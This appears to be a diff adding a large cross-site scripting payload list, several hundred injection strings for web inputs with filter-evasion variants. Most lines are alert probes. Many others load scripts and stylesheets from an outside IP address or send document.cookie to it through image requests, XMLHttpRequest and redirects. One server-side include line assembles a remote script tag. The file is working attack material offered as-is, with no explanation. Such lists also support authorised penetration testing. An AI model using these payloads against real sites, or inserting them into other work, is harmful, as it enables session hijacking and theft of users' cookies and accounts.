@@ -1,0 +1,407 @@
+<!--
+<!-- Write your comments here -->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://104.131.126.236/xss.js></SCRIPT>'"-->
+<!--[if IE 9]>
+<!--[if gte IE 4]> 
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<![endif]-->
+¼script¾alert(¢XSS¢)¼/script¾
+"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+"><a href="javascript:confirm%28 1%29">Clickme</a>
+"><a href=javascript:prompt%28 1%29>Clickme</a>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><h1/ondrag=co\u006efir\u006d`1`)>DragMe
+"><iframe/src=javascript:prompt(1)>
+"><img src=x onerror=co\u006efir\u006d`1`>
+"><svg/onload=prompt(1)>
+"><textarea autofocus onfocus=prompt(1)>
+<img src="https://teamultimate.in/wp-content/uploads/2017/03/slide-main.png">
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+"></tag><svg onload=alert(1)>
+"><a onmouseover="alert(0)">Cliff</a> 
+"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+"><img src=x onerror=prompt(1)>
+"><img/src=x%0Aonerror=prompt`1`>
+"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+"><script>/* 
+"><script>alert(document.cookie)</script> 
+"><script>co\u006efir\u006d`1`</script>
+"><svg onload=alert(1)>
+"><svg onload=alert(1)>.gif
+"><svg/onload=co\u006efir\u006d`1`>
+"><textarea autofocus onfocus=co\u006efir\u006d(1)>
+"autofocus/onfocus=alert(1)//
+"o<x>nmouseover=alert<x>(1)//
+"onload="alert(9999999)" 
+"onmouseover=alert(1)//
+#"><img src=M onerror=alert('XSS');>
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'; "></svg>
+%22;alert%28%27XSS%29//
+%22onload%3D%22alert%28%22HiCliff%20%22%29%22 
+%22onload%3D%22alert%28187%29%22 
+%22onload%3D%22alert%28document.cookie%29%22 
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%3Aexpression%28alert%28188%29%29%3B 
+%3C<![CDATA[script]]>%3Ealert%28document.cookie%29%3C%2F<![CDATA[script]]>%3E 
+%3CDIV+STYLE%3D%22xss%3Aex%2F*XSS*%2Fpression%28alert%28%27HiCliff%27%29%29%22%3E 
+%3Cmeta+http?equiv%3D%22refresh%22+content%3D%220%3Burl%3Dhttp://104.131.126.236/alerts/sendCookie.html%22%3E 
+%3Cscript%3Ealert%28999%29%3C%2Fscript%3E 
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E 
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%38%37%29%3c%2f%73%63%72%69%70%74%3e 
+&#39;&#88;&#83;&#83;&#39;&#41;>
+&#39;&#88;&#83;&#83;&#39;&#41;> 
+&lt;svg/onload&equals;alert(1)&gt;
+'"</Script><Html /Onmouseover=(alert)(1) //
+'';!--"<XSS>=&{()}
+'-alert(1)//
+':expression(alert(9999999)); 
+';'>"><marquee>test</marquee><plaintext/onmouseover=prompt(test)>
+';--"<HiCliff>=&{()} 
+';</script>">'><SCrIPT>alert(String.fromCharCode(88,83,83))</scRipt>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//
+";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//
+--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+('\141\154\145\162\164\50\61\51')()
+*/</script>'>alert(1)/*<script/1='
+*/</script><!-- 
+*/alert(1)">
+'onload="/*<svg/1='
+*/alert(1)l/* 
+//'/<@/></script></div></script>
+--><select */onclick=alert()><o>1<o>2')//"<!--
+0000083&#0000039&#0000041> 
+0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>\"-confirm(3)-\"
+0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>\"-confirm(3)-\"
+1'"><iframe id=465 SRC=http://104.131.126.236> 
+1'"><iframe+id%3d465+SRC%3dhttp%3a//104.131.126.236> 
+:expression(alert(9999999)); 
+;alert(String.fromCharCode(72,73,67,76,73,70,70))//';alert(String.fromCharCode(72,73,67,76,73,70,70))//"; 
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+</TITLE><SCRIPT>alert("hiCliff");</SCRIPT> 
+</script><script>alert('XSS');</script>
+</script><svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+<<SCRIPT>alert("HiCliff");//<</SCRIPT> 
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<<SCRIPT>alert("test");//<</SCRIPT>
+<? echo('<SCR)'; 
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<A CLASS=HiCliff></A> 
+<A HREF="http://66.102.7.147/">XSS</A>
+<BASE HREF="javascript:alert('HiCliff');//"> 
+<BASE HREF="javascript:alert('XSS');//">
+<BGSOUND SRC="javascript:alert('HiCliff');"> 
+<BGSOUND SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('HiCliff')"> 
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('HiCliff')> 
+<BODY ONLOAD=alert('XSS')>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY onload!#$%&()*~+?_.,:;?@[/|\]^`=alert("HiCliff")> 
+<BR SIZE="&{alert('HiCliff')}"> 
+<BR SIZE="&{alert('XSS')}">
+<BR SIZE="&{alert(9999999)}"> 
+<BR SIZE="&{alert(document.cookie)}"> 
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background?image: url(&#1;javascript:alert('HiCliff'))"> 
+<DIV STYLE="background?image: url(javascript:alert('HiCliff'))"> 
+<DIV STYLE="background?image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"> 
+<DIV STYLE="width: expression(alert('HiCliff'));"> 
+<DIV STYLE="width: expression(alert('XSS'));">
+<DIV STYLE="width: expression(alert(999999999));"> 
+<DIV onmouseover=alert(document.cookie);">Hi Cliff</div> 
+<FRAMESET><FRAME SRC="javascript:alert('HiCliff');"></FRAMESET> 
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<FRAMESET><FRAME SRC=javascript:alert('HiCliff');"></FRAMESET> 
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<IFRAME SRC="javascript:alert('HiCliff');"></IFRAME> 
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME> 
+<IMG """><SCRIPT>alert("HiCliff")</SCRIPT>"> 
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG DYNSRC="javascript:alert('HiCliff')"> 
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('HiCliff')"> 
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC= onmouseover="alert('HiCliff')"> 
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG SRC=" &#14;  javascript:alert('HiCliff');"> 
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="JaVaScriPt:alert(999999)> 
+<IMG SRC="http://104.131.126.236/logMe.html?cookie"> 
+<IMG SRC="http://104.131.126.236/logMe.html?cookie="+document.cookie;> 
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav 
+<IMG SRC="jav&#x09;ascript:alert('HiCliff');"> 
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('HiCliff');"> 
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('HiCliff');"> 
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('HiCliff')" 
+<IMG SRC="javascript:alert('HiCliff');"> 
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert(999999);"> 
+<IMG SRC="javascript:alert(999999)> 
+<IMG SRC="livescript:[code]">
+<IMG SRC="livescript:[code]"> 
+<IMG SRC=# onmouseover="alert('HiCliff')"> 
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& 
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; 
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> 
+<IMG SRC='vbscript:msgbox("HiCliff")'> 
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=JaVaScRiPt:alert('HiCliff')> 
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("Don?t forget to say, 'HiCliff'")`> 
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert("HiCliff")> 
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=javascript:alert('HiCliff')> 
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert(999999)> 
+<IMG SRC=javascript:alert(String.fromCharCode(72,73,67,76,73,70,70))> 
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('HiCliff'))"> 
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMG onmouseover="alert('HiCliff')"> 
+<IMG onmouseover="alert('xxs')">
+<IMG style="xss:expr/*XSS*/ession(alert(99999999));"> 
+<INPUT TYPE="IMAGE" SRC="javascript:alert('HiCliff');"> 
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://104.131.126.236/xss.css"> 
+<LINK REL="stylesheet" HREF="http://104.131.126.236/xss.css">
+<LINK REL="stylesheet" HREF="javascript:alert('HiCliff');"> 
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK rel="stylesheet" type="text/css" href="file://C:/alerts/cookieAlert.css"> 
+<META HTTP-EQUIV="Link" Content="<http://104.131.126.236/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP?EQUIV="Link" CONTENT="<http://104.131.126.236/test_cookie.txt>; REL=stylesheet"> 
+<META HTTP?EQUIV="Link" Content="<http://104.131.126.236/alerts/cookieAlert.css>;REL=stylesheet"> 
+<META HTTP?EQUIV="REFRESH" CONTENT="1; URL=http://104.131.126.236/alerts/sendCookie.html"> 
+<META HTTP?EQUIV="REFRESH" CONTENT="1; URL=http://104.131.126.236/alerts/test_cookie.txt"> 
+<META HTTP?EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('HiCliff');"> 
+<META HTTP?EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"> 
+<META HTTP?EQUIV="refresh" CONTENT="0;url=javascript:alert('HiCliff');"> 
+<META HTTP?EQUIV=REFRESH CONTENT="1; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> 
+<OBJECT TYPE="text/x-scriptlet" DATA="http://104.131.126.236/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x?scriptlet" DATA="http://104.131.126.236/scriptlet.html"></OBJECT> 
+<SCRIPT "a='>'" SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SCRIPT SRC="http://104.131.126.236/CBH.jpg"></SCRIPT> 
+<SCRIPT SRC=//104.131.126.236/.j> 
+<SCRIPT SRC=//104.131.126.236/.j>
+<SCRIPT SRC=http://104.131.126.236/xss.js></SCRIPT> 
+<SCRIPT SRC=http://104.131.126.236/xss.js?< B > 
+<SCRIPT SRC=http://104.131.126.236/xss.js></SCRIPT>
+<SCRIPT SRC=http://104.131.126.236/xss.js?< B >
+<SCRIPT a=">" '' SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://104.131.126.236/xss.js"></SCRIPT> 
+<SCRIPT/XSS SRC="http://104.131.126.236/xss.js"></SCRIPT> 
+<SCRIPT>alert('XSS');</SCRIPT> 
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://104.131.126.236/xss.js"></SCRIPT>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN> 
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> 
+<STYLE TYPE="text/javascript">alert('HiCliff');</STYLE> 
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('HiCliff')")}</STYLE> 
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>.XSS{background?image:url("javascript:alert('HiCliff')");}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("HiCliff")';</STYLE> 
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert(99999999999)';<\style> 
+<STYLE>@import'http://104.131.126.236/xss.css';</STYLE> 
+<STYLE>@import'http://104.131.126.236/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://104.131.126.236/xssmoz.xml#xss")}</STYLE>
+<STYLE>BODY{?moz?binding:url("http://104.131.126.236/xssmoz.xml#HiCliff")}</STYLE> 
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<STYLE>li {list?style?image:url("javascript:alert('HiCliff')");}</STYLE><UL><LI>XSS</br> 
+<Script>alert(1)</Script> 
+<Svg OnLoad=alert(1)>
+<TABLE BACKGROUND="javascript:alert('HiCliff')"> 
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('HiCliff')"> 
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('HiCliff')"></B></I></XML> 
+<XML SRC="xsstest.xml" ID=I></XML> 
+<XSS STYLE="behavior: url(xss.htc);">
+<XSS STYLE="behavior: url(xss.htc);"> 
+<XSS STYLE="xss:expression(alert('HiCliff'))"> 
+<XSS STYLE="xss:expression(alert('XSS'))">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+<a href="http://104.131.126.236/alerts/sendCookie.html" 
+<a href=javascript:alert(1)>click
+<a onmouseover="alert(0)">Cliff</a> 
+<a onmouseover="alert(document.cookie)">Cliff</a> 
+<a onmouseover="alert(document.cookie)">Hi Cliff</a> 
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=%22alert(0)%22>Cliff</a> 
+<a onmouseover=alert(0)>Cliff</a> 
+<a onmouseover=alert(document.cookie)>Hi Cliff</a> 
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<audio src onloadstart=alert(1)>
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=%23x>click this!#x
+<body onhelp=alert(1)>press F1! 
+<body onload=alert(1)>
+<body onorientationchange=alert(1)>
+<body onpageshow=alert(1)>
+<body onresize=alert(1)>press F12!
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><x id=x>#x
+<div>Click Me</div> 
+<embed src=javascript:alert(1)>
+<form action=javascript:alert(1)><input type=submit>
+<form onsubmit=alert(1)><input type=submit>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<html ontouchstart=alert(1)>
+<i/*xss*/frame src="https://crap.org" style="position:absolute;top:0px></i/*HiCliff*/frame> 
+<iframe SRC="javascript:alert(99999999999);"></iframe> 
+<iframe id=465 height="600" width="20000" SRC=http://104.131.126.236/alerts/sendCookie.html/> 
+<iframe src=http://104.131.126.236/scriptlet.html> 
+<iframe src=http://104.131.126.236/scriptlet.html <
+<iframe src=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<iframe+SRC%3d"javascript%3aalert(9999999999999)%3b"></iframe> 
+<img/src="x"/onerror="[boom]">
+<input autofocus onblur=alert(1)>
+<isindex action=javascript:alert(1) type=submit value=click>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<isindex/autofocus/onfocus=alert()>
+<keygen autofocus onfocus=alert(1)>
+<link rel="stylesheet" HREF="http://104.131.126.236/alerts/cookieAlert.css"> 
+<link rel="stylesheet" href="http://104.131.126.236/alerts/cookieAlert.css"> 
+<link rel="stylesheet" href="http://104.131.126.236/alerts/sendCookie.html"> 
+<link type="text/css" rel="stylesheet" href="http://104.131.126.236/alerts/cookieAlert.css"/> 
+<marquee loop=1 width=0 onfinish=alert(1)>
+<marquee onstart=alert(1)>
+<marquee/onstart=alert()>
+<math><brute href=javascript:alert(1)>click
+<math><brute xlink:href=javascript:alert(1)>click 
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<meta http?equiv="Set?Cookie" C 
+<meta http?equiv="default?style" content="http://104.131.126.236/alerts/cookieAlert.css"> 
+<meta http?equiv="default?style" content="http://104.131.126.236/alerts/test_cookie.txt"> 
+<meta http?equiv="refresh" content="0; url=data:text/html;base64,PHNjcmlwdD4=;document.cookie;base64,PC9zY3JpcHQ+"> 
+<meta http?equiv="refresh" content="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxODcpPC9zY3JpcHQ+"> 
+<meta http?equiv="refresh" content="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"> 
+<meta http?equiv="refresh" content="0; url=data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxODcp"> 
+<meta http?equiv="refresh" content="0; url=data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxODcpOw=="> 
+<meta http?equiv="refresh" content="0; url=http://104.131.126.236/test_cookie.txt"> 
+<meta http?equiv="refresh" content="1; url=javascript:alert('HiCliff');"> 
+<object data=javascript:alert(1)>
+<sCR<script>iPt>alert(1)</SCr</script>IPt>
+<scr%00ipt>alert(document.cookie)</scr%00ipt> 
+<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
+<script language="javascript">window.location.href = "http://104.131.126.236/alerts/sendCookie.html";</script> 
+<script src=data:,alert(1)>
+<script/src=data:,alert()>
+<script/x>alert(1)</script>
+<script>alert("Cliff")</script> 
+<script>alert(1)</script>
+<script>alert(999999)</script> 
+<script>alert(document.cookie)</script> 
+<script>alert(var nURL = 'http://104.131.126.236/sendCookie.html?COOKIES=' + document.cookie + ';REFERRER=' + document.referrer;var x = null; x = new XMLHttpRequest();x.open("GET", nURL, false);x.send(null);window.location.href = "http://104.131.126.236/index.html";)</script> 
+<script>for((i)in(self))eval(i)(1)</script>
+<script>function My Address(IP) {alert("Your local IP is "+IP)}</script> 
+<script>new Image().src="http://104.131.126.236/blah.php?output="+document.cookie;</script> 
+<select onchange=alert(1)><option>1<option>2
+<svg onload="void 'javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d
+<svg onload=alert&#40;1&#41>
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert(1)>
+<svg/onload=%26%23097lert%26lpar;1337)>
+<svg><script xlink:href=data:,alert(1) />
+<video onloadstart=alert(1)><source>
+<video/poster/onerror=alert()>
+<w contenteditable id=x onfocus=alert()>
+<x contenteditable onblur=alert(1)>lose focus!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x contenteditable onpaste=alert(1)>paste here!
+<x onclick=alert(1)>click this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncopy=alert(1)>copy this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+></SCRIPT>">'><SCRIPT>alert(0)</SCRIPT> 
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(72,73,67,76,73,70,70))</SCRIPT> 
+?1">Hi Cliff!</a> 
+?script?alert(?HiCliff?)?/script? 
+Code(72,73,67,76,73,70,70))//-- 
+[<]]>script<![CDATA[>]]>alert('HiCliff')<![CDATA[<]]>/script<![CDATA[>]]> 
+[<blockquote cite="]">[" onmouseover="alert('XSS');" ]
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
+\";alert('HiCliff');// 
+\";alert('XSS');//
+\x3cscript\x3ealert(9999999)\x3c/script\x3e 
+`-alert(1)">'onload="`<svg/1='
+alert(9999999) 
+alert(String.fromCharCode(72,73,67,76,73,70,70))//";alert(String.fromChar
+alert;pg("XSS")
+body { top:expression(document.body.onclick=function(){alert(document.body.innerHTML)}) } 
+data:text/html,<svg onload=alert(1)>'-alert(1)-'
+echo('IPT>alert("HiCliff")</SCRIPT>'); ?> 
+element[attribute='<img src=x onerror=alert('XSS');>
+exp/*<A STYLE='no\xss:noxss("*//*");
+exp/*<A STYLE='no\xss:noxss("*//*"); 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:alert%281%29;
+javascript:alert(1)
+javascript:alert(99999) 
+javascript:alert(99999); 
+onload=function(){$.getScript('//104.131.126.236/2.js')}
+onload=x=>$.getScript('//104.131.126.236/2.js')
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+p=<svg/1='&q='onload=alert(1)>
+perl ?e 'print "<IMG SRC=java\0script:alert(\"HiCliff\")>";' > out 
+target="_blank"style="position:relative;left:20px;font?size:15px;z?index:
+BC-->LC<svg/onload=alert(/XSS/)//
+xss:ex/*HiCliff*//*/*/pression(alert("HiCliff"))'> 
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
